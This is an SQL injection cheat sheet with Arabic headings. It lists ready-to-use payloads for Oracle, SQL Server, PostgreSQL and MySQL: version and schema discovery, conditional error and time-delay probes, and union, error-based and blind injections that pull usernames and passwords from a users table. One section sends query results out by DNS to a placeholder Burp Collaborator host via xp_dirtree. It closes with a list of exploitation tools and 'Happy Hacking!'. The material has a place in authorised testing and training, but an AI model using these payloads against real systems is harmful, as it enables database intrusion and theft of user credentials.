
# 🐍 SQL Injection Cheat Sheet
```
> **مرجع سريع** لأوامر حقن SQL في مختلف قواعد البيانات.

---

## 📊 مقارنة قواعد البيانات

| الدالة | Oracle | Microsoft | PostgreSQL | MySQL |
|--------|--------|-----------|------------|-------|
| **دمج النصوص** | `'foo'||'bar'` | `'foo'+'bar'` | `'foo'||'bar'` | `CONCAT('foo','bar')` |
| **استخراج نص** | `SUBSTR('foobar',4,2)` | `SUBSTRING('foobar',4,2)` | `SUBSTRING('foobar',4,2)` | `SUBSTRING('foobar',4,2)` |
| **التعليق** | `--comment` | `--comment` | `--comment` | `#comment` |
| **الإصدار** | `SELECT banner FROM v$version` | `SELECT @@version` | `SELECT version()` | `SELECT @@version` |
| **التأخير** | `dbms_pipe.receive_message(('a'),10)` | `WAITFOR DELAY '0:0:10'` | `SELECT pg_sleep(10)` | `SELECT SLEEP(10)` |

---

## 🔍 الاستعلامات الأساسية

### معرفة الجداول
```sql
-- Oracle
SELECT * FROM all_tables

-- Microsoft / PostgreSQL / MySQL
SELECT * FROM information_schema.tables
```

### معرفة الأعمدة
```sql
-- Oracle
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME'

-- Microsoft / PostgreSQL / MySQL
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'
```

---

## ⚠️ الأخطاء المشروطة

```sql
-- Oracle
SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual

-- Microsoft
SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END

-- PostgreSQL
1 = (SELECT CASE WHEN (1=1) THEN 1/(SELECT 0) ELSE NULL END)

-- MySQL
SELECT IF(1=1,(SELECT table_name FROM information_schema.tables),'a')
```

---

## ⏱️ التأخير المشروط

```sql
-- Oracle
SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual

-- Microsoft
IF (1=1) WAITFOR DELAY '0:0:10'

-- PostgreSQL
SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END

-- MySQL
SELECT IF(1=1,SLEEP(10),'a')
```

---

## 🌐 استعلام DNS

```sql
-- Microsoft (Windows)
exec master..xp_dirtree '//BURP-COLLABORATOR/a'

-- PostgreSQL
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR'

-- MySQL (Windows)
LOAD_FILE('\\\\BURP-COLLABORATOR\\a')
```

### تسريب البيانات عبر DNS
```sql
-- Microsoft
declare @p varchar(1024);
set @p=(SELECT YOUR-QUERY-HERE);
exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR/a"')
```

---

## 📝 أمثلة عملية

### 1. Union Based Injection
```sql
' UNION SELECT null,null,table_name FROM information_schema.tables --
' UNION SELECT null,null,column_name FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT null,username,password FROM users --
```

### 2. Error Based Injection
```sql
' AND 1=CONVERT(int, (SELECT TOP 1 username FROM users)) --
' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT password FROM users LIMIT 1))) --
```

### 3. Blind Boolean Injection
```sql
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' --
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 97 --
```

### 4. Blind Time Based Injection
```sql
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0) --
' AND (SELECT CASE WHEN SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' THEN pg_sleep(5) ELSE pg_sleep(0) END) --
```

---

## 🛠️ أدوات مفيدة

| الأداة | الوصف |
|--------|-------|
| **SQLMap** | أداة آلية لاكتشاف واستغلال ثغرات SQLi |
| **Burp Suite** | اعتراض وتعديل الطلبات |
| **Havij** | أداة رسومية لاستغلال SQLi |
| **sqlsus** | أداة سطر أوامر متقدمة |

---

## 📚 مراجع مفيدة

- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [SQL Injection Cheat Sheet - Netsparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)

---

<div align="center">

**🐍 Happy Hacking!**

</div>
```

